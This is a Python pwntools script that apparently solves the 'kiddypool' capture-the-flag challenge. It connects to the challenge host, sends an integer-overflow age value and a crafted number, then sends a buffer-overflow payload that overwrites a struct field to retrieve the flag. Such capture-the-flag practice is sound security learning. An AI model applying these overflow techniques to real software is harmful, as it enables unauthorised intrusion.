from pwn import *

host = "kiddypool.aws.jerseyctf.com"
port = 9001

p = remote(host, port)

# Step 1: Receive and send age
p.recvuntil(b"How old are you")
p.sendline(b"-2147483648")

# Step 2: Receive and send first dive input
p.recvuntil(b"Ok sport, take your first dive into the water")
p.sendline(b"4607182418800017408")

# Step 3: Receive swim hoop prompt
p.recvuntil(b"Swim through the hoop!")

# Step 4: Buffer overflow payload - Ensure correct struct offset overwrite
payload = b"A" * 0x40  # Padding to reach `hoop`
payload += p32(0xECE8E9E1)  # Overwrite `hoop` with the correct value

# Debug: Print payload before sending
print(f"Payload: {payload}")

p.sendline(payload)

# Step 5: Check response
response = p.recv().decode(errors="ignore")  # Decode safely
print(response)

if "Good Job!" in response:
    p.sendline(b"Hacker")  # Send medal name
    flag = p.recv().decode(errors="ignore")
    print(f"Flag: {flag.strip()}")
else:
    print("Exploit failed. Check struct overwrite.")

p.close()
